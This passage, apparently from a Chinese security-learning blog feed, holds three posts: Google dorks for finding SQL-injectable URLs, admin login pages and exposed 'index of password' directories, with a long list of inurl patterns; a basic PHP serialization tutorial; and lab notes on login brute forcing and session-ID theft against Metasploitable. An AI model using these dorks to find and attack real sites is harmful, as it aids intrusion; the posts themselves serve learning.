<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201026175236.png"><br>打开网页看一下<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201026175443.png"></p>
<h2 id="inurl在URL关键字"><a href="#inurl在URL关键字" class="headerlink" title="inurl在URL关键字"></a>inurl在URL关键字</h2><p>inurl搜索URL地址存在指定的关键字，可以搜索注入点地址<br>咧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:.php?id&#x3D;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201026181918.png"><br>随便打开一个</p>
<p>搜索登录url<br>咧：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:&#x2F;admin&#x2F;login.php</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201026190254.png"><br>随便打开一个<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201026190326.png"></p>
<p>常见的目录<br><a href="https://github.com/mIcHyAmRaNe/okadminfinder3/blob/master/LinkFile/adminpanellinks.txt">https://github.com/mIcHyAmRaNe/okadminfinder3/blob/master/LinkFile/adminpanellinks.txt</a></p>
<p>注入点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:item_id&#x3D;	</span><br><span class="line">inurl:review.php?id&#x3D;	</span><br><span class="line">inurl:hosting_info.php?id&#x3D;</span><br><span class="line">inurl:newsid&#x3D;	</span><br><span class="line">inurl:iniziativa.php?in&#x3D;	</span><br><span class="line">inurl:gallery.php?id&#x3D;</span><br><span class="line">inurl:trainers.php?id&#x3D;	</span><br><span class="line">inurl:curriculum.php?id&#x3D;	</span><br><span class="line">inurl:rub.php?idr&#x3D;</span><br><span class="line">inurl:news-full.php?id&#x3D;	</span><br><span class="line">inurl:labels.php?id&#x3D;	</span><br><span class="line">inurl:view_faq.php?id&#x3D;</span><br><span class="line">inurl:news_display.php?getid&#x3D;	</span><br><span class="line">inurl:story.php?id&#x3D;	</span><br><span class="line">inurl:artikelinfo.php?id&#x3D;</span><br><span class="line">inurl:index2.php?option&#x3D;	</span><br><span class="line">inurl:look.php?ID&#x3D;	</span><br><span class="line">inurl:detail.php?ID&#x3D;</span><br><span class="line">inurl:readnews.php?id&#x3D;	</span><br><span class="line">inurl:newsone.php?id&#x3D;	</span><br><span class="line">inurl:index.php?&#x3D;</span><br><span class="line">inurl:top10.php?cat&#x3D;	</span><br><span class="line">inurl:aboutbook.php?id&#x3D;	</span><br><span class="line">inurl:profile_view.php?id&#x3D;</span><br><span class="line">inurl:newsone.php?id&#x3D;	</span><br><span class="line">inurl:material.php?id&#x3D;	</span><br><span class="line">inurl:category.php?id&#x3D;</span><br><span class="line">inurl:event.php?id&#x3D;	</span><br><span class="line">inurl:opinions.php?id&#x3D;	</span><br><span class="line">inurl:publications.php?id&#x3D;</span><br><span class="line">inurl:product-item.php?id&#x3D;	</span><br><span class="line">inurl:announce.php?id&#x3D;	</span><br><span class="line">inurl:fellows.php?id&#x3D;</span><br><span class="line">inurl:sql.php?id&#x3D;	</span><br><span class="line">inurl:rub.php?idr&#x3D;	</span><br><span class="line">inurl:downloads_info.php?id&#x3D;</span><br><span class="line">inurl:index.php?catid&#x3D;	</span><br><span class="line">inurl:galeri_info.php?l&#x3D;	</span><br><span class="line">inurl:prod_info.php?id&#x3D;</span><br><span class="line">inurl:news.php?catid&#x3D;	</span><br><span class="line">inurl:tekst.php?idt&#x3D;	</span><br><span class="line">inurl:shop.php?do&#x3D;part&amp;id&#x3D;</span><br><span class="line">inurl:index.php?id&#x3D;	</span><br><span class="line">inurl:newscat.php?id&#x3D;	</span><br><span class="line">inurl:productinfo.php?id&#x3D;</span><br><span class="line">inurl:news.php?id&#x3D;	</span><br><span class="line">inurl:newsticker_info.php?idn&#x3D;	</span><br><span class="line">inurl:collectionitem.php?id&#x3D;</span><br><span class="line">inurl:index.php?id&#x3D;	</span><br><span class="line">inurl:rubrika.php?idr&#x3D;	</span><br><span class="line">inurl:band_info.php?id&#x3D;</span><br><span class="line">inurl:trainers.php?id&#x3D;	</span><br><span class="line">inurl:rubp.php?idr&#x3D;	</span><br><span class="line">inurl:product.php?id&#x3D;</span><br><span class="line">inurl:buy.php?category&#x3D;	</span><br><span class="line">inurl:offer.php?idf&#x3D;	</span><br><span class="line">inurl:releases.php?id&#x3D;</span><br><span class="line">inurl:article.php?ID&#x3D;	</span><br><span class="line">inurl:art.php?idm&#x3D;	</span><br><span class="line">inurl:ray.php?id&#x3D;</span><br><span class="line">inurl:play_old.php?id&#x3D;	</span><br><span class="line">inurl:title.php?id&#x3D;	</span><br><span class="line">inurl:produit.php?id&#x3D;</span><br><span class="line">inurl:declaration_more.php?decl_id&#x3D;	</span><br><span class="line">inurl:news_view.php?id&#x3D;	</span><br><span class="line">inurl:pop.php?id&#x3D;</span><br><span class="line">inurl:pageid&#x3D;	</span><br><span class="line">inurl:select_biblio.php?id&#x3D;	</span><br><span class="line">inurl:shopping.php?id&#x3D;</span><br><span class="line">inurl:games.php?id&#x3D;	</span><br><span class="line">inurl:humor.php?id&#x3D;	</span><br><span class="line">inurl:productdetail.php?id&#x3D;</span><br><span class="line">inurl:page.php?file&#x3D;	</span><br><span class="line">inurl:aboutbook.php?id&#x3D;	</span><br><span class="line">inurl:post.php?id&#x3D;</span><br><span class="line">inurl:newsDetail.php?id&#x3D;	</span><br><span class="line">inurl:ogl_inet.php?ogl_id&#x3D;	</span><br><span class="line">inurl:viewshowdetail.php?id&#x3D;</span><br><span class="line">inurl:gallery.php?id&#x3D;	</span><br><span class="line">inurl:fiche_spectacle.php?id&#x3D;	</span><br><span class="line">inurl:clubpage.php?id&#x3D;</span><br><span class="line">inurl:article.php?id&#x3D;	</span><br><span class="line">inurl:communique_detail.php?id&#x3D;	</span><br><span class="line">inurl:memberInfo.php?id&#x3D;</span><br><span class="line">inurl:show.php?id&#x3D;	</span><br><span class="line">inurl:sem.php3?id&#x3D;	</span><br><span class="line">inurl:section.php?id&#x3D;</span><br><span class="line">inurl:staff_id&#x3D;	</span><br><span class="line">inurl:kategorie.php4?id&#x3D;	</span><br><span class="line">inurl:theme.php?id&#x3D;</span><br><span class="line">inurl:newsitem.php?num&#x3D;	</span><br><span class="line">inurl:news.php?id&#x3D;	</span><br><span class="line">inurl:page.php?id&#x3D;</span><br><span class="line">inurl:readnews.php?id&#x3D;	</span><br><span class="line">inurl:index.php?id&#x3D;	</span><br><span class="line">inurl:shredder-categories.php?id&#x3D;</span><br><span class="line">inurl:top10.php?cat&#x3D;	</span><br><span class="line">inurl:faq2.php?id&#x3D;	</span><br><span class="line">inurl:tradeCategory.php?id&#x3D;</span><br><span class="line">inurl:historialeer.php?num&#x3D;	</span><br><span class="line">inurl:show_an.php?id&#x3D;	</span><br><span class="line">inurl:product_ranges_view.php?ID&#x3D;</span><br><span class="line">inurl:reagir.php?num&#x3D;	</span><br><span class="line">inurl:preview.php?id&#x3D;	</span><br><span class="line">inurl:shop_category.php?id&#x3D;</span><br><span class="line">inurl:Stray-Questions-View.php?num&#x3D;	</span><br><span class="line">inurl:loadpsb.php?id&#x3D;	</span><br><span class="line">inurl:transcript.php?id&#x3D;</span><br><span class="line">inurl:forum_bds.php?num&#x3D;	</span><br><span class="line">inurl:opinions.php?id&#x3D;	</span><br><span class="line">inurl:channel_id&#x3D;</span><br><span class="line">inurl:game.php?id&#x3D;	</span><br><span class="line">inurl:spr.php?id&#x3D;	</span><br><span class="line">inurl:aboutbook.php?id&#x3D;</span><br><span class="line">inurl:view_product.php?id&#x3D;	</span><br><span class="line">inurl:pages.php?id&#x3D;	</span><br><span class="line">inurl:preview.php?id&#x3D;</span><br><span class="line">inurl:newsone.php?id&#x3D;	</span><br><span class="line">inurl:announce.php?id&#x3D;	</span><br><span class="line">inurl:loadpsb.php?id&#x3D;</span><br><span class="line">inurl:sw_comment.php?id&#x3D;	</span><br><span class="line">inurl:clanek.php4?id&#x3D;	</span><br><span class="line">inurl:pages.php?id&#x3D;</span><br><span class="line">inurl:news.php?id&#x3D;	</span><br><span class="line">inurl:participant.php?id&#x3D;	 </span><br><span class="line">inurl:avd_start.php?avd&#x3D;	</span><br><span class="line">inurl:download.php?id&#x3D;	 </span><br><span class="line">inurl:event.php?id&#x3D;	</span><br><span class="line">inurl:main.php?id&#x3D;	 </span><br><span class="line">inurl:product-item.php?id&#x3D;	</span><br><span class="line">inurl:review.php?id&#x3D;	 </span><br><span class="line">inurl:sql.php?id&#x3D;	</span><br><span class="line">inurl:chappies.php?id&#x3D;	 </span><br><span class="line">inurl:material.php?id&#x3D;	</span><br><span class="line">inurl:read.php?id&#x3D;	 </span><br><span class="line">inurl:clanek.php4?id&#x3D;	</span><br><span class="line">inurl:prod_detail.php?id&#x3D;	 </span><br><span class="line">inurl:announce.php?id&#x3D;	</span><br><span class="line">inurl:viewphoto.php?id&#x3D;	 </span><br><span class="line">inurl:chappies.php?id&#x3D;	</span><br><span class="line">inurl:article.php?id&#x3D;	 </span><br><span class="line">inurl:read.php?id&#x3D;	</span><br><span class="line">inurl:person.php?id&#x3D;	 </span><br><span class="line">inurl:viewapp.php?id&#x3D;	</span><br><span class="line">inurl:productinfo.php?id&#x3D;	 </span><br><span class="line">inurl:viewphoto.php?id&#x3D;	</span><br><span class="line">inurl:showimg.php?id&#x3D;	 </span><br><span class="line">inurl:rub.php?idr&#x3D;	</span><br><span class="line">inurl:view.php?id&#x3D;	 </span><br><span class="line">inurl:galeri_info.php?l&#x3D;	</span><br><span class="line">inurl:website.php?id&#x3D;	 </span><br></pre></td></tr></table></figure>

<h2 id="intitle指定搜索的标题"><a href="#intitle指定搜索的标题" class="headerlink" title="intitle指定搜索的标题"></a>intitle指定搜索的标题</h2><p>intitle搜索关键字标题的关键字<br>咧：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">intitle:后台登陆</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201027075055.png"><br>随便打开一个<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201027075130.png"></p>
<h3 id="搜索索引目录"><a href="#搜索索引目录" class="headerlink" title="搜索索引目录"></a>搜索索引目录</h3><p>咧：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">intitle:index of &quot;parent directory&quot;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201027083829.png"><br>随便打开一个<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201027083857.png"></p>
<h3 id="搜索索引密码"><a href="#搜索索引密码" class="headerlink" title="搜索索引密码"></a>搜索索引密码</h3><p>咧：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">intitle:index of &quot;password&quot;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201027084238.png"><br>随便打开一个<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201027084312.png"></p>
<h3 id="搜索索引登录页面"><a href="#搜索索引登录页面" class="headerlink" title="搜索索引登录页面"></a>搜索索引登录页面</h3><p>咧:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">intitle:index of &quot;login&quot;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201027085317.png"></p>
<p>随便打开一个<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201027085619.png"></p>
<h2 id="intext搜索正文存在的关键字"><a href="#intext搜索正文存在的关键字" class="headerlink" title="intext搜索正文存在的关键字"></a>intext搜索正文存在的关键字</h2><p>可以用intext来搜索网站是什么框架搭建的<br>咧：<br>CMS是一个比如织梦CMS</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">intext:powered &quot;*CMS&quot;</span><br></pre></td></tr></table></figure>
<h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h2><p>他符号有<code>-</code>,<code>*</code>,<code>&quot;&quot;</code>,<code>~</code>,<code>..</code></p>
<p><code>-</code>符号是搜索结果不能有什么关键字”sql注入”<br><code>*</code>这个一看就能看出来比如我们搜索一个<code>*.txt</code><br><code>&quot;&quot;</code>搜索结果必须有里面的关键字比如”sql注入”<br><code>~</code>搜索出来的近意词<br><code>..</code>搜索的时间比如<code>2017..2020</code></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>1.序列化漏洞之什么是序列化和反序列化</title>
    <url>/2020/10/19/1.%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="什么是序列化"><a href="#什么是序列化" class="headerlink" title="什么是序列化"></a>什么是序列化</h2><p>序列化用到的函数<code>serialize()</code><br>序列化就是将一个数组和对象变成一个字符，可以方便传递和存储，他的结构不会改变</p>
<h2 id="数组序列化"><a href="#数组序列化" class="headerlink" title="数组序列化"></a>数组序列化</h2><p>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//数组</span></span><br><span class="line">$I =<span class="keyword">array</span>(<span class="string">&#x27;One&#x27;</span>,<span class="string">&#x27;two&#x27;</span>,<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出序列化之后的数据</span></span><br><span class="line"><span class="keyword">echo</span> serialize($I);</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201018093916.png"><br><strong>输出的内容介绍</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:3:&#123;i:0;s:3:&quot;One&quot;;i:1;s:3:&quot;two&quot;;i:2;s:5:&quot;three&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><code>a:</code>类型数组|<br>类型有<code>a代表数组,s代表字符,i代表数字,o代表对象,N代表空的,b代表布尔，等等我会把他放到最下面</code><br><code>3:</code>数组长度|<br><code>i:0;</code>i是int型的,<code>0</code>是第一个数组|<br><code>s:</code>是一个字符串|<br><code>3:&quot;two&quot;;</code>有三个字符是<code>&quot;two&quot;</code>|<br><code>i:1;</code>i是int型的,<code>1</code>第二个数组|<br><code>s:</code>是一个字符串|<br><code>3:&quot;two&quot;;</code>有三个字符是<code>&quot;two&quot;</code>|<br><code>i:</code>i是int型的,<code>2</code>第三个数组|<br><code>s:</code>是一个字符串|<br><code>5:&quot;three&quot;;</code>有五个字符是<code>&quot;three&quot;</code>|</p>
<h2 id="数组反序列化"><a href="#数组反序列化" class="headerlink" title="数组反序列化"></a>数组反序列化</h2><p>反序列化会用到<code>unserialize()</code>函数进行反序列化<br>我们将序列化出来的字符保存到文件里面然后在给反向序列化出来</p>
<p><strong>将序列化的字符串保存到文件里面</strong><br>咧：<br>下面会用到<code>file_put_contents()</code>函数<br><code>file_put_contents()</code>函数使用<a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">https://www.runoob.com/php/func-filesystem-file-put-contents.html</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//数组</span></span><br><span class="line">$I =<span class="keyword">array</span>(<span class="string">&#x27;One&#x27;</span>,<span class="string">&#x27;two&#x27;</span>,<span class="number">1111</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出序列化之后的数据</span></span><br><span class="line"><span class="keyword">echo</span> serialize($I);</span><br><span class="line">$a=serialize($I);</span><br><span class="line"></span><br><span class="line"><span class="comment">//叫序列化的内容保存到a.txt文件里面</span></span><br><span class="line">file_put_contents(<span class="string">&quot;a.txt&quot;</span>,$a);</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201018111706.png"><br>已经保存到了a.txt文件里面了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201018111824.png"></p>
<p><strong>读取文件的被序列化的字符串给反向序列化出来</strong><br>反向序列化会把被序列化的数组给变回来<br>咧：<br><code>fread()</code> 函数打开文件<br><code>fgets()</code> 函数用于从文件读取单行<br><code>fclose()</code> 函数用于关闭打开的文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//打开文件</span></span><br><span class="line">$myfile = fopen(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="comment">//叫读出来的字符赋值给变量$a</span></span><br><span class="line">$a=fgets($myfile);</span><br><span class="line"><span class="comment">//反序列化赋值给变量$b</span></span><br><span class="line">$b=unserialize($a);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出变量的相关信息</span></span><br><span class="line">var_dump($b);</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取数组里面的内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.$b[<span class="number">0</span>].$b[<span class="number">1</span>].$b[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//关闭打开的文件</span></span><br><span class="line">fclose($myfile);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201018114751.png"></p>
<h2 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h2><p>对象序列化方法和数组一样<br>咧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $twourl =<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ccc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//序列化并输出出来</span></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201018175957.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Site&quot;:2:&#123;s:3:&quot;url&quot;;s:3:&quot;aaa&quot;;s:6:&quot;twourl&quot;;s:3:&quot;bbb&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><code>o:</code>类型是对象|<br>类型有<code>o代表对象s代表字符,i代表数字,a代表数组,,N代表空的,b代表布尔，等等我会把他放到最下面</code><br><code>4:</code>代表对象名字站几个字符|<br><code>&quot;Site&quot;:</code>代表对象名字|<br><code>2:</code>代表里面有变量|<br><code>s:</code>代表是一个字符串类型的|<br><code>3:</code>代表内容有三个字符|<br><code>&quot;url&quot;;</code>代表变量名是<code>&quot;url&quot;</code>|<br><code>s:</code>代表是一个字符串类型的|<br><code>3:</code>代表内容有三个字符|<br><code>&quot;aaa&quot;</code>代表<code>&quot;url&quot;</code>内容是<code>&quot;aaa&quot;</code>|<br><code>s:</code>代表是一个字符串类型的|<br><code>6:</code>代表内容有六个字符|<br><code>&quot;twourl&quot;;</code>代表变量名是<code>&quot;twourl&quot;</code>|<br><code>s:</code>代表是一个字符串类型的|<br><code>3:</code>代表内容有三个字符|<br><code>&quot;bbb&quot;</code>代表<code>&quot;twourl&quot;</code>内容是<code>&quot;bbb&quot;</code>|</p>
<h2 id="对象反序列化"><a href="#对象反序列化" class="headerlink" title="对象反序列化"></a>对象反序列化</h2><p>对象和数组反序列化也是一样的</p>
<p>反序列化会用到<code>unserialize()</code>函数进行反序列化<br>我们将序列化出来的字符保存到文件里面然后在给反向序列化出来</p>
<p><strong>将序列化的字符串保存到文件里面</strong><br>咧：<br>下面会用到<code>file_put_contents()</code>函数<br><code>file_put_contents()</code>函数使用<a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">https://www.runoob.com/php/func-filesystem-file-put-contents.html</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $twourl =<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//公用方法</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ccc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//序列化的字符串赋值给$b变量</span></span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="comment">//叫序列化的内容保存到a.txt文件里面</span></span><br><span class="line">file_put_contents(<span class="string">&quot;a.txt&quot;</span>,$b);</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201018185001.png"></p>
<p><strong>读取文件的被序列化的字符串给反向序列化出来</strong><br>反向序列化会把被序列化的数组给变回来<br>咧：<br><code>fread()</code> 函数打开文件<br><code>fgets()</code> 函数用于从文件读取单行<br><code>fclose()</code> 函数用于关闭打开的文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $twourl =<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//公用方法</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ccc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//序列化的字符串赋值给$b变量</span></span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="comment">//叫序列化的内容保存到a.txt文件里面</span></span><br><span class="line">file_put_contents(<span class="string">&quot;a.txt&quot;</span>,$b);</span><br><span class="line"></span><br><span class="line"><span class="comment">//打开文件</span></span><br><span class="line">$myfile = fopen(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="comment">//叫读出来的字符赋值给变量$a</span></span><br><span class="line">$a=fgets($myfile);</span><br><span class="line"><span class="comment">//反序列化赋值给变量$b</span></span><br><span class="line">$b=unserialize($a);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出反序列化</span></span><br><span class="line">var_dump($b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//输出反序列化内容</span></span><br><span class="line">var_dump($b-&gt;url);</span><br><span class="line"><span class="comment">//关闭打开的文件</span></span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201021083302.png"></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>序列化漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>1.手动挖掘漏洞身份认证</title>
    <url>/2019/09/14/1.%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E%E6%98%8E%E5%AE%9E%E9%AA%8C%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>任务086：手动漏洞挖掘（二）</p>
<p><strong>这个是我的看的教程的笔记。</strong><br><strong>里面基本都是我自己实验的照片。</strong><br>英语后面括号里的都是英语翻译，我真的英语不好</p>
<h2 id="身份认证常见方式"><a href="#身份认证常见方式" class="headerlink" title="身份认证常见方式"></a>身份认证常见方式</h2><ul>
<li><p>1.常用弱口令/基于字典密码爆破                        </p>
</li>
<li><p>2.账号锁定</p>
</li>
<li><p>3.信息收集</p>
<ul>
<li>手机号</li>
<li>密码错误提示</li>
</ul>
</li>
<li><p>4.密码嗅探</p>
</li>
<li><p>常用弱口令/基于字典密码爆破<br>就是像网站登陆账号密码了列账号admin密码12345</p>
</li>
<li><p>账号锁定</p>
<ul>
<li>就是连续密码错误就不在登陆了</li>
</ul>
</li>
<li><p>信息收集</p>
<ul>
<li>1.手机号像出来的账号里手机号什么什么的排名像18272xxxx15就号找到这个账号</li>
<li>2.密码错误提示比如我输入一个账号和密码有的说账号或密码错误有的说密码错误</li>
</ul>
</li>
</ul>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p> 靶机metasploitable-linux-2.0.0</p>
<h2 id="比较登陆"><a href="#比较登陆" class="headerlink" title="比较登陆"></a><strong>比较登陆</strong></h2><p>第一个账号正确密码错误第二个账号密码都错误<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190913113243233.png" alt="在这里插入图片描述"><br>发现登陆输入账号正确和输入账号错误返回的结果都一样只有时间有的变化<br>metasploitable-linux-2.0.0登陆安全性还是比较好的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190913113549738.png" alt="在这里插入图片描述"></p>
<h2 id="用户破解登录"><a href="#用户破解登录" class="headerlink" title="用户破解登录"></a>用户破解登录</h2><p>如果输正确的账号和错误的账号不同的我们就可以找到账号，就可以密码破解了</p>
<p><strong>如果账号密码都没有破解成功的话我们是不是真的无能为力了其实不是其实还可以换个角度来突破身份认证</strong></p>
<ul>
<li>现在的网站你只要成功输入账号密码登陆一次就会给就会给你一个cookie（苦k）的随机值返回给你然后你每一次请求都会带着这个cookie（苦k）然后服务器看见这个SessionID（赛神爱低）——是这个我已经登陆这个账号的，服务器就会给你这个账号运行你访问资源的</li>
<li>如果有什么方法可以截获这个SessionID（赛神爱低）这也是一个可以突破目标系统身份认证的一个方法通过跨站脚本社会工程学可以偷取SessionID（赛神爱低）的具体内容在后面课程里在接收在这先说一下这也是一种手段。</li>
<li>另外还有一些做的不好的会在URL里面进行传输SessionID（赛神爱低）显示出来<br>直接复制连接就可以登陆进去了</li>
<li>有的做的好的身份验证，可能叫SessionID（赛神爱低）放到cookie（苦k）里<br>就可以使用嗅探来获取SessionID（赛神爱低）注入到你的浏览器就获取了你的权限</li>
</ul>
<h2 id="SessionID说明"><a href="#SessionID说明" class="headerlink" title="SessionID说明"></a>SessionID说明</h2><p>SessionID（赛神爱低）有的是一种存放在本地文件里面<br>SessionID（赛神爱低）或者是一种存在内存里面<br>现在几乎都不是在本地的文件的方式存在了大部分都是存放在内存里面这个可以通过抓包跨站来获取SessionID（赛神爱低）</p>
<h2 id="查看SessionID"><a href="#查看SessionID" class="headerlink" title="查看SessionID"></a>查看SessionID</h2><p><strong>下面是教拿到了SessionID（赛神爱低）来注入到浏览器里从而获得登陆管理员一样的全权，靶机metasploitable-linux-2.0.0安全行是最高的。</strong></p>
